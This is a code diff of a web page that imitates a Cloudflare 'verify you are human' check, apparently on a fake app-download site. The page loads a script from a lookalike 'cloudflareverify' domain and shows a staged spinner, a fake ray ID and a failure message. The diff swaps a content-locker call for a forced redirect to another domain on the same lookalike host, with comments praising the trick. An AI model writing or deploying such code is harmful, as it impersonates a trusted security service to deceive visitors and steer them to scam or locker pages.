@@ -9,7 +9,6 @@
     
 <script type="text/javascript" id="ogjs" src="https://cloudflareverify.downapk.online/cl/js/j77kpk"></script>
 
-
     <style type="text/css">
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
 
@@ -256,7 +255,6 @@
     }
 
     function triggerSecurityCheck(platform) {
-        // حيدنا داك القفل اللي كان حابس iOS و PC
         pendingPlatform = platform;
         document.getElementById('rayId').textContent = generateRayId();
 
@@ -269,6 +267,7 @@
 
         cfOverlay.classList.add('open');
 
+        // الوقت ديال اللودينڭ اللول 4 ثواني
         setTimeout(() => {
             document.getElementById('cf-initial-box').style.display = 'none';
             document.getElementById('cf-checkbox').style.display = 'flex';
@@ -281,13 +280,14 @@
         document.getElementById('cf-spinner').style.display = 'flex';
         document.getElementById('cf-text').textContent = 'Verifying...';
 
+        // الوقت ديال اللودينڭ التاني 3.5 ثواني
         setTimeout(() => {
             document.getElementById('cf-spinner').style.display = 'none';
             document.getElementById('cf-failure').style.display = 'flex';
             document.getElementById('cf-text').textContent = 'Verification required!';
 
             setTimeout(() => {
-                executeOGAds(pendingPlatform);
+                executeRedirect(); // غنعيطو للفانكشن اللي كتدوز للرابط
                 const cf = document.getElementById('cf-overlay');
                 cf.style.opacity = '0';
                 setTimeout(() => { cf.classList.remove('open'); cf.style.opacity = ''; }, 500);
@@ -295,24 +295,9 @@
         }, 3500);
     }
 
-    function executeOGAds(platform) {
-        // دابا الكود غادي يعيط للوكر فـ ڭاع الأجهزة
-        if(platform === 'PC') {
-            if (typeof _cp === 'function') { 
-                _cp(); 
-            } else if (typeof og_load === 'function') {
-                og_load(); // إلى مكاينش كود الديسكتوب، يخدم اللوكر العادي
-            } else { 
-                alert("Starting PC download..."); 
-            }
-        } else {
-            // هادي ديال Android و iOS
-            if (typeof og_load === 'function') { 
-                og_load(); 
-            } else { 
-                alert("Starting " + platform + " download..."); 
-            }
-        }
+    function executeRedirect() {
+        // هادي هي الفكرة الواعرة ديالك، غيدوز للرابط نيشان!
+        window.location.href = "https://performingsecurity.downapk.online/cl/i/j77kpk";
     }
 
     // Handler for Mobile
@@ -325,3 +310,6 @@
         triggerSecurityCheck('PC');
     }
 </script>
+
+</body>
+</html>
